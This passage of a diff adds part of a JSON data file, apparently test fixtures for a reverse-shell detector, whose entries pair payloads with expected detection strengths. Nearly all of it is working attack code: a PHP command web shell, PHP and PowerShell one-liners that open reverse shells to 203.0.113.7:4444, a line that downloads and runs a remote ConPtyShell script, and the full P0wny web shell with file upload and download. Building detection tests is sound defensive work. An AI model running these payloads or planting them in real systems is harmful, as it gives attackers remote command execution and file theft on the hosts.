+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "PHP cmd",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "windows",
+    "mac"
+   ],
+   "lines": [
+    "<html>",
+    "<body>",
+    "<form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">",
+    "<input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\">",
+    "<input type=\"SUBMIT\" value=\"Execute\">",
+    "</form>",
+    "<pre>",
+    "<?php",
+    "    if(isset($_GET['cmd']))",
+    "    {",
+    "        system($_GET['cmd']);",
+    "    }",
+    "?>",
+    "</pre>",
+    "</body>",
+    "<script>document.getElementById(\"cmd\").focus();</script>",
+    "</html>"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "strong",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "PHP cmd 2",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "windows",
+    "mac"
+   ],
+   "lines": [
+    "<?php if(isset($_REQUEST[\"cmd\"])){ echo \"<pre>\"; $cmd = ($_REQUEST[\"cmd\"]); system($cmd); echo \"</pre>\"; die; }?>"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "PHP exec",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "php -r '$sock=fsockopen(\"203.0.113.7\",4444);exec(\"sh <&3 >&3 2>&3\");'"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "PHP shell_exec",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "php -r '$sock=fsockopen(\"203.0.113.7\",4444);shell_exec(\"sh <&3 >&3 2>&3\");'"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "PHP system",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "windows",
+    "mac"
+   ],
+   "lines": [
+    "php -r '$sock=fsockopen(\"203.0.113.7\",4444);system(\"sh <&3 >&3 2>&3\");'"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "PHP passthru",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "php -r '$sock=fsockopen(\"203.0.113.7\",4444);passthru(\"sh <&3 >&3 2>&3\");'"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "PHP `",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "windows",
+    "mac"
+   ],
+   "lines": [
+    "php -r '$sock=fsockopen(\"203.0.113.7\",4444);`sh <&3 >&3 2>&3`;'"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "PHP popen",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "windows",
+    "mac"
+   ],
+   "lines": [
+    "php -r '$sock=fsockopen(\"203.0.113.7\",4444);popen(\"sh <&3 >&3 2>&3\", \"r\");'"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "PHP proc_open",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "windows",
+    "mac"
+   ],
+   "lines": [
+    "php -r '$s=fsockopen(\"203.0.113.7\",4444);proc_open(\"sh\",[$s,$s,$s],$p);'"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Windows ConPty",
+   "section": "ReverseShell",
+   "meta": [
+    "windows"
+   ],
+   "lines": [
+    "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 203.0.113.7 4444"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "PowerShell #1",
+   "section": "ReverseShell",
+   "meta": [
+    "windows"
+   ],
+   "lines": [
+    "$LHOST = \"203.0.113.7\"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "PowerShell #2",
+   "section": "ReverseShell",
+   "meta": [
+    "windows"
+   ],
+   "lines": [
+    "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('203.0.113.7',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "PowerShell #3",
+   "section": "ReverseShell",
+   "meta": [
+    "windows"
+   ],
+   "lines": [
+    "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('203.0.113.7', 4444);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\""
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "PowerShell #4 (TLS)",
+   "section": "ReverseShell",
+   "meta": [
+    "windows"
+   ],
+   "lines": [
+    "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('203.0.113.7', 4444);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "P0wny Shell (Webshell)",
+   "section": "ReverseShell",
+   "meta": [
+    "windows",
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "<?php",
+    "$SHELL_CONFIG = array(",
+    "    'username' => 'p0wny',",
+    "    'hostname' => 'shell',",
+    ");",
+    "function expandPath($path) {",
+    "    if (preg_match(\"#^(~[a-zA-Z0-9_.-]*)(/.*)?$#\", $path, $match)) {",
+    "        exec(\"echo $match[1]\", $stdout);",
+    "        return $stdout[0] . $match[2];",
+    "    }",
+    "    return $path;",
+    "}",
+    "function allFunctionExist($list = array()) {",
+    "    foreach ($list as $entry) {",
+    "        if (!function_exists($entry)) {",
+    "            return false;",
+    "        }",
+    "    }",
+    "    return true;",
+    "}",
+    "function executeCommand($cmd) {",
+    "    $output = '';",
+    "    if (function_exists('exec')) {",
+    "        exec($cmd, $output);",
+    "        $output = implode(\"\\n\", $output);",
+    "    } else if (function_exists('shell_exec')) {",
+    "        $output = shell_exec($cmd);",
+    "    } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {",
+    "        ob_start();",
+    "        system($cmd);",
+    "        $output = ob_get_contents();",
+    "        ob_end_clean();",
+    "    } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {",
+    "        ob_start();",
+    "        passthru($cmd);",
+    "        $output = ob_get_contents();",
+    "        ob_end_clean();",
+    "    } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {",
+    "        $handle = popen($cmd, 'r');",
+    "        while (!feof($handle)) {",
+    "            $output .= fread($handle, 4096);",
+    "        }",
+    "        pclose($handle);",
+    "    } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {",
+    "        $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);",
+    "        $output = stream_get_contents($pipes[1]);",
+    "        proc_close($handle);",
+    "    }",
+    "    return $output;",
+    "}",
+    "function isRunningWindows() {",
+    "    return stripos(PHP_OS, \"WIN\") === 0;",
+    "}",
+    "function featureShell($cmd, $cwd) {",
+    "    $stdout = \"\";",
+    "    if (preg_match(\"/^\\s*cd\\s*(2>&1)?$/\", $cmd)) {",
+    "        chdir(expandPath(\"~\"));",
+    "    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\", $cmd)) {",
+    "        chdir($cwd);",
+    "        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);",
+    "        chdir(expandPath($match[1]));",
+    "    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\", $cmd)) {",
+    "        chdir($cwd);",
+    "        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);",
+    "        return featureDownload($match[1]);",
+    "    } else {",
+    "        chdir($cwd);",
+    "        $stdout = executeCommand($cmd);",
+    "    }",
+    "    return array(",
+    "        \"stdout\" => base64_encode($stdout),",
+    "        \"cwd\" => base64_encode(getcwd())",
+    "    );",
+    "}",
+    "function featurePwd() {",
+    "    return array(\"cwd\" => base64_encode(getcwd()));",
+    "}",
+    "function featureHint($fileName, $cwd, $type) {",
+    "    chdir($cwd);",
+    "    if ($type == 'cmd') {",
+    "        $cmd = \"compgen -c $fileName\";",
+    "    } else {",
+    "        $cmd = \"compgen -f $fileName\";",
+    "    }",
+    "    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";",
+    "    $files = explode(\"\\n\", shell_exec($cmd));",
+    "    foreach ($files as &$filename) {",
+    "        $filename = base64_encode($filename);",
+    "    }",
+    "    return array(",
+    "        'files' => $files,",
+    "    );",
+    "}",
+    "function featureDownload($filePath) {",
+    "    $file = @file_get_contents($filePath);",
+    "    if ($file === FALSE) {",
+    "        return array(",
+    "            'stdout' => base64_encode('File not found / no read permission.'),",
+    "            'cwd' => base64_encode(getcwd())",
+    "        );",
+    "    } else {",
+    "        return array(",
+    "            'name' => base64_encode(basename($filePath)),",
+    "            'file' => base64_encode($file)",
+    "        );",
+    "    }",
+    "}",
+    "function featureUpload($path, $file, $cwd) {",
+    "    chdir($cwd);",
+    "    $f = @fopen($path, 'wb');",
+    "    if ($f === FALSE) {",
+    "        return array(",
+    "            'stdout' => base64_encode('Invalid path / no write permission.'),",
+    "            'cwd' => base64_encode(getcwd())",
+    "        );",
+    "    } else {",
+    "        fwrite($f, base64_decode($file));",
+    "        fclose($f);",
+    "        return array(",
+    "            'stdout' => base64_encode('Done.'),",
+    "            'cwd' => base64_encode(getcwd())",
+    "        );",
+    "    }",
+    "}",
+    "function initShellConfig() {",
+    "    global $SHELL_CONFIG;",
+    "    if (isRunningWindows()) {",
+    "        $username = getenv('USERNAME');",
+    "        if ($username !== false) {",
+    "            $SHELL_CONFIG['username'] = $username;",
+    "        }",
+    "    } else {",
+    "        $pwuid = posix_getpwuid(posix_geteuid());",
+    "        if ($pwuid !== false) {",
+    "            $SHELL_CONFIG['username'] = $pwuid['name'];",
+    "        }",
+    "    }",
+    "    $hostname = gethostname();",
+    "    if ($hostname !== false) {",
+    "        $SHELL_CONFIG['hostname'] = $hostname;",
+    "    }",
+    "}",
+    "if (isset($_GET[\"feature\"])) {",
+    "    $response = NULL;",
+    "    switch ($_GET[\"feature\"]) {",
+    "        case \"shell\":",
+    "            $cmd = $_POST['cmd'];",
+    "            if (!preg_match('/2>/', $cmd)) {",
+    "                $cmd .= ' 2>&1';",
+    "            }",
+    "            $response = featureShell($cmd, $_POST[\"cwd\"]);",
+    "            break;",
+    "        case \"pwd\":",
+    "            $response = featurePwd();",
+    "            break;",
+    "        case \"hint\":",
+    "            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);",
+    "            break;",
+    "        case 'upload':",
+    "            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);",
+    "    }",
+    "    header(\"Content-Type: application/json\");",
+    "    echo json_encode($response);",
+    "    die();",
+    "} else {",
+    "    initShellConfig();",
+    "}",
+    "?><!DOCTYPE html>",
+    "<html>",
+    "    <head>",
+    "        <meta charset=\"UTF-8\" />",
+    "        <title>p0wny@shell:~#</title>",
+    "        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />",
+    "        <style>",
+    "            html, body {",
+    "                margin: 0;",
+    "                padding: 0;",
+    "                background: #333;",
+    "                color: #eee;",
+    "                font-family: monospace;",
+    "                width: 100vw;",
+    "                height: 100vh;",
+    "                overflow: hidden;",
+    "            }",
+    "            *::-webkit-scrollbar-track {",
+    "                border-radius: 8px;",
+    "                background-color: #353535;",
+    "            }",
+    "            *::-webkit-scrollbar {",
+    "                width: 8px;",
+    "                height: 8px;",
+    "            }",
+    "            *::-webkit-scrollbar-thumb {",
+    "                border-radius: 8px;",
+    "                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);",
+    "                background-color: #bcbcbc;",
+    "            }",
+    "            #shell {",
+    "                background: #222;",
+    "                box-shadow: 0 0 5px rgba(0, 0, 0, .3);",
+    "                font-size: 10pt;",
+    "                display: flex;",
+    "                flex-direction: column;",
+    "                align-items: stretch;",
+    "                max-width: calc(100vw - 2 * var(--shell-margin));",
+    "                max-height: calc(100vh - 2 * var(--shell-margin));",
+    "                resize: both;",
+    "                overflow: hidden;",
+    "                width: 100%;",
+    "                height: 100%;",
+    "                margin: var(--shell-margin) auto;",
+    "            }",
+    "            #shell-content {",
+    "                overflow: auto;",
+    "                padding: 5px;",
+    "                white-space: pre-wrap;",
+    "                flex-grow: 1;",
+    "            }",
+    "            #shell-logo {",
+    "                font-weight: bold;",
+    "                color: #FF4180;",
+    "                text-align: center;",
+    "            }",
+    "            :root {",
+    "                --shell-margin: 25px;",
+    "            }",
+    "            @media (min-width: 1200px) {",
+    "                :root {",
+    "                    --shell-margin: 50px !important;",
+    "                }",
+    "            }",
+    "            @media (max-width: 991px),",
+    "                   (max-height: 600px) {",
+    "                #shell-logo {",
+    "                    font-size: 6px;",
+    "                    margin: -25px 0;",
+    "                }",
+    "                :root {",
+    "                    --shell-margin: 0 !important;",
+    "                }",
+    "                #shell {",
+    "                    resize: none;",
+    "                }",
+    "            }",
+    "            @media (max-width: 767px) {",
+    "                #shell-input {",
+    "                    flex-direction: column;",
+    "                }",
+    "            }",
+    "            @media (max-width: 320px) {",
+    "                #shell-logo {",
+    "                    font-size: 5px;",
+    "                }",
+    "            }",
+    "            .shell-prompt {",
+    "                font-weight: bold;",
+    "                color: #75DF0B;",
+    "            }",
+    "            .shell-prompt > span {",
+    "                color: #1BC9E7;",
+    "            }",
+    "            #shell-input {",
+    "                display: flex;",
+    "                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);",
+    "                border-top: rgba(255, 255, 255, .05) solid 1px;",
+    "                padding: 10px 0;",
+    "            }",
+    "            #shell-input > label {",
+    "                flex-grow: 0;",
+    "                display: block;",
+    "                padding: 0 5px;",
+    "                height: 30px;",
+    "                line-height: 30px;",
+    "            }",
+    "            #shell-input #shell-cmd {",
+    "                height: 30px;",
+    "                line-height: 30px;",
+    "                border: none;",
+    "                background: transparent;",
+    "                color: #eee;",
+    "                font-family: monospace;",
+    "                font-size: 10pt;",
+    "                width: 100%;",
+    "                align-self: center;",
+    "                box-sizing: border-box;",
+    "            }",
+    "            #shell-input div {",
+    "                flex-grow: 1;",
+    "                align-items: stretch;",
+    "            }",
+    "            #shell-input input {",
+    "                outline: none;",
+    "            }",
+    "        </style>",
+    "        <script>",
+    "            var SHELL_CONFIG = <?php echo json_encode($SHELL_CONFIG); ?>;",
+    "            var CWD = null;",
+    "            var commandHistory = [];",
+    "            var historyPosition = 0;",
+    "            var eShellCmdInput = null;",
+    "            var eShellContent = null;",
+    "            function _insertCommand(command) {",
+    "                eShellContent.innerHTML += \"\\n\\n\";",
+    "                eShellContent.innerHTML += '<span class=\\\"shell-prompt\\\">' + genPrompt(CWD) + '</span> ';",
+    "                eShellContent.innerHTML += escapeHtml(command);",
+    "                eShellContent.innerHTML += \"\\n\";",
+    "                eShellContent.scrollTop = eShellContent.scrollHeight;",
+    "            }",
+    "            function _insertStdout(stdout) {",
+    "                eShellContent.innerHTML += escapeHtml(stdout);",
+    "                eShellContent.scrollTop = eShellContent.scrollHeight;",
+    "            }",
+    "            function _defer(callback) {",
+    "                setTimeout(callback, 0);",
+    "            }",
+    "            function featureShell(command) {",
+    "                _insertCommand(command);",
+    "                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {",
+    "                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);",
+    "                } else if (/^\\s*clear\\s*$/.test(command)) {",
+    "                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer",
+    "                    eShellContent.innerHTML = '';",
+    "                } else {",
+    "                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {",
+    "                        if (response.hasOwnProperty('file')) {",
+    "                            featureDownload(atob(response.name), response.file)",
+    "                        } else {",
+    "                            _insertStdout(atob(response.stdout));",
+    "                            updateCwd(atob(response.cwd));",
+    "                        }",
+    "                    });",
+    "                }",
+    "            }",
+    "            function featureHint() {",
+    "                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete",
+    "                function _requestCallback(data) {",
+    "                    if (data.files.length <= 1) return;  // no completion",
+    "                    data.files = data.files.map(function(file){",
+    "                        return atob(file);",
+    "                    });",
+    "                    if (data.files.length === 2) {",
+    "                        if (type === 'cmd') {",
+    "                            eShellCmdInput.value = data.files[0];",
+    "                        } else {",
+    "                            var currentValue = eShellCmdInput.value;",
+    "                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);",
+    "                        }",
+    "                    } else {",
+    "                        _insertCommand(eShellCmdInput.value);",
+    "                        _insertStdout(data.files.join(\"\\n\"));",
+    "                    }",
+    "                }",
+    "                var currentCmd = eShellCmdInput.value.split(\" \");",
+    "                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";",
+    "                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];",
+    "                makeRequest(",
+    "                    \"?feature=hint\",",
+    "                    {",
+    "                        filename: fileName,",
+    "                        cwd: CWD,",
+    "                        type: type",
+    "                    },",
+    "                    _requestCallback",
+    "                );",
+    "            }",
+    "            function featureDownload(name, file) {",
+    "                var element = document.createElement('a');",
+    "                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);",
+    "                element.setAttribute('download', name);",
+    "                element.style.display = 'none';",
+    "                document.body.appendChild(element);",
+    "                element.click();",
+    "                document.body.removeChild(element);",
+    "                _insertStdout('Done.');",
+    "            }",
+    "            function featureUpload(path) {",
+    "                var element = document.createElement('input');",
+    "                element.setAttribute('type', 'file');",
+    "                element.style.display = 'none';",
+    "                document.body.appendChild(element);",
+    "                element.addEventListener('change', function () {",
+    "                    var promise = getBase64(element.files[0]);",
+    "                    promise.then(function (file) {",
+    "                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {",
+    "                            _insertStdout(atob(response.stdout));",
+    "                            updateCwd(atob(response.cwd));",
+    "                        });",
+    "                    }, function () {",
+    "                        _insertStdout('An unknown client-side error occurred.');",
+    "                    });",
+    "                });",
+    "                element.click();",
+    "                document.body.removeChild(element);",
+    "            }",
+    "            function getBase64(file, onLoadCallback) {",
+    "                return new Promise(function(resolve, reject) {",
+    "                    var reader = new FileReader();",
+    "                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };",
+    "                    reader.onerror = reject;",
+    "                    reader.readAsDataURL(file);",
+    "                });",
+    "            }",
+    "            function genPrompt(cwd) {",
+    "                cwd = cwd || \"~\";",
+    "                var shortCwd = cwd;",
+    "                if (cwd.split(\"/\").length > 3) {",
+    "                    var splittedCwd = cwd.split(\"/\");",
+    "                    shortCwd = \"…/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];",
+    "                }",
+    "                return SHELL_CONFIG[\"username\"] + \"@\" + SHELL_CONFIG[\"hostname\"] + \":<span title=\\\"\" + cwd + \"\\\">\" + shortCwd + \"</span>#\";",
+    "            }",
+    "            function updateCwd(cwd) {",
+    "                if (cwd) {",
+    "                    CWD = cwd;",
+    "                    _updatePrompt();",
+    "                    return;",
+    "                }",
+    "                makeRequest(\"?feature=pwd\", {}, function(response) {",
+    "                    CWD = atob(response.cwd);",
+    "                    _updatePrompt();",
+    "                });",
+    "            }",
+    "            function escapeHtml(string) {",
+    "                return string",
+    "                    .replace(/&/g, \"&amp;\")",
+    "                    .replace(/</g, \"&lt;\")",
+    "                    .replace(/>/g, \"&gt;\");",
+    "            }",
+    "            function _updatePrompt() {",
+    "                var eShellPrompt = document.getElementById(\"shell-prompt\");",
+    "                eShellPrompt.innerHTML = genPrompt(CWD);",
+    "            }",
+    "            function _onShellCmdKeyDown(event) {",
+    "                switch (event.key) {",
+    "                    case \"Enter\":",
+    "                        featureShell(eShellCmdInput.value);",
+    "                        insertToHistory(eShellCmdInput.value);",
+    "                        eShellCmdInput.value = \"\";",
+    "                        break;",
+    "                    case \"ArrowUp\":",
+    "                        if (historyPosition > 0) {",
+    "                            historyPosition--;",
+    "                            eShellCmdInput.blur();",
+    "                            eShellCmdInput.value = commandHistory[historyPosition];",
+    "                            _defer(function() {",
+    "                                eShellCmdInput.focus();",
+    "                            });",
+    "                        }",
+    "                        break;",
+    "                    case \"ArrowDown\":",
+    "                        if (historyPosition >= commandHistory.length) {",
+    "                            break;",
+    "                        }",
+    "                        historyPosition++;",
+    "                        if (historyPosition === commandHistory.length) {",
+    "                            eShellCmdInput.value = \"\";",
+    "                        } else {",
+    "                            eShellCmdInput.blur();",
+    "                            eShellCmdInput.focus();",
+    "                            eShellCmdInput.value = commandHistory[historyPosition];",
+    "                        }",
+    "                        break;",
+    "                    case 'Tab':",
+    "                        event.preventDefault();",
+    "                        featureHint();",
+    "                        break;",
+    "                }",
+    "            }",
+    "            function insertToHistory(cmd) {",
+    "                commandHistory.push(cmd);",
+    "                historyPosition = commandHistory.length;",
+    "            }",
+    "            function makeRequest(url, params, callback) {",
+    "                function getQueryString() {",
+    "                    var a = [];",
+    "                    for (var key in params) {",
+    "                        if (params.hasOwnProperty(key)) {",
+    "                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));",
+    "                        }",
+    "                    }",
+    "                    return a.join(\"&\");",
+    "                }",
+    "                var xhr = new XMLHttpRequest();",
+    "                xhr.open(\"POST\", url, true);",
+    "                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");",
+    "                xhr.onreadystatechange = function() {",
+    "                    if (xhr.readyState === 4 && xhr.status === 200) {",
+    "                        try {",
+    "                            var responseJson = JSON.parse(xhr.responseText);",
+    "                            callback(responseJson);",
+    "                        } catch (error) {",
+    "                            alert(\"Error while parsing response: \" + error);",
+    "                        }",
+    "                    }",
+    "                };",
+    "                xhr.send(getQueryString());",
+    "            }",
+    "            document.onclick = function(event) {",
+    "                event = event || window.event;",
+    "                var selection = window.getSelection();",
+    "                var target = event.target || event.srcElement;",
+    "                if (target.tagName === \"SELECT\") {",
+    "                    return;",
+    "                }",
+    "                if (!selection.toString()) {",
+    "                    eShellCmdInput.focus();",
+    "                }",
+    "            };",
+    "            window.onload = function() {",
+    "                eShellCmdInput = document.getElementById(\"shell-cmd\");",
+    "                eShellContent = document.getElementById(\"shell-content\");",
+    "                updateCwd();",
+    "                eShellCmdInput.focus();",
+    "            };",
+    "        </script>",
+    "    </head>",
+    "    <body>",
+    "        <div id=\"shell\">",
+    "            <pre id=\"shell-content\">",
+    "                <div id=\"shell-logo\">",
+    "        ___                         ____      _          _ _        _  _   <span></span>",
+    " _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>",
+    "| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|<span></span>",
+    "| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>",
+    "| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>",
+    "|_|                         |___/  \\____/                                  <span></span>",
+    "                </div>",
+    "            </pre>",
+    "            <div id=\"shell-input\">",
+    "                <label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\">???</label>",
+    "                <div>",
+    "                    <input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/>",
+    "                </div>",
+    "            </div>",
+    "        </div>",
+    "    </body>",
+    "</html>"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
